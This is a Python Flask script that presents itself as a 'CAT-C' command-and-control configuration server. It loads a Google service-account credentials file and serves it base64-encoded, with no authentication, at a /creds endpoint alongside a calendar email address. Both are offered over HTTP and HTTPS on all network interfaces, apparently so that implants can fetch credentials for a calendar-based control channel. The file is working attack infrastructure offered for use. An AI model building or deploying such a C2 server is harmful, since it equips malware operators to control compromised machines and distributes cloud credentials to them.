#!/usr/bin/env python3
"""
🐱 CAT-C C2 CONFIG SERVER v3.2 - DARK RED BANNER
"""

from flask import Flask
import base64
import json
import os
import sys
from threading import Thread

# 🔥 COLORED OUTPUT
class Colors:
    GREEN = '\033[92m'
    DARK_RED = '\033[31m'    # Dark red
    BRIGHT_RED = '\033[91m'  # Bright red  
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

app = Flask(__name__)

# 🔥 DARK RED CAT-C BANNER
CAT_C_BANNER = r"""
{Colors.DARK_RED}{Colors.BOLD}
               _
            |\/( _
            /   -`'.
            |  =__-/=
            /   (
           ;     \\
          /      |
         /    ,  /
       .'      | |
      /      --; |
      |         ||  __
      |        /_;-` _`'.
      \  '-----' _.-` '._)
MEOW   `'-------"
{Colors.BRIGHT_RED}------------------------------------------------{Colors.END}
""".format(Colors=Colors)


# 🔥 LOAD credentials.json (Google Service Account)
try:
    with open('credits.json', 'r') as f:  # Fixed filename
        CREDS_JSON = f.read()
    print(f"{Colors.GREEN}✅ credentials.json loaded{Colors.END}")
except:
    print(f"{Colors.DARK_RED}❌ ERROR: credentials.json required{Colors.END}")
    sys.exit(1)

CALENDAR_EMAIL = "yourcalender@gmail.com"

@app.route('/creds')
def creds_endpoint():
    return base64.b64encode(CREDS_JSON.encode()).decode()

@app.route('/email')
def email_endpoint():
    return CALENDAR_EMAIL

@app.route('/')
def status():
    return "CAT-C C2 SERVER ACTIVE"

def run_http():
    app.run(host='0.0.0.0', port=8080)

def run_https():
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc')

if __name__ == '__main__':
    print(CAT_C_BANNER)
    print(f"{Colors.YELLOW}Calendar:{Colors.END}  {Colors.CYAN}{CALENDAR_EMAIL}{Colors.END}")
    print(f"{Colors.BLUE}HTTP:{Colors.END}   0.0.0.0:8080")
    print(f"{Colors.BLUE}HTTPS:{Colors.END}  0.0.0.0:8443")
    print(f"{Colors.BOLD}Endpoints:{Colors.END} /creds /email")
    print("-" * 40)
    
    # Run servers silently
    http_thread = Thread(target=run_http, daemon=True)
    https_thread = Thread(target=run_https, daemon=True)
    
    http_thread.start()
    https_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print(f"\n{Colors.DARK_RED}CAT-C shutdown{Colors.END}")
        sys.exit(0)
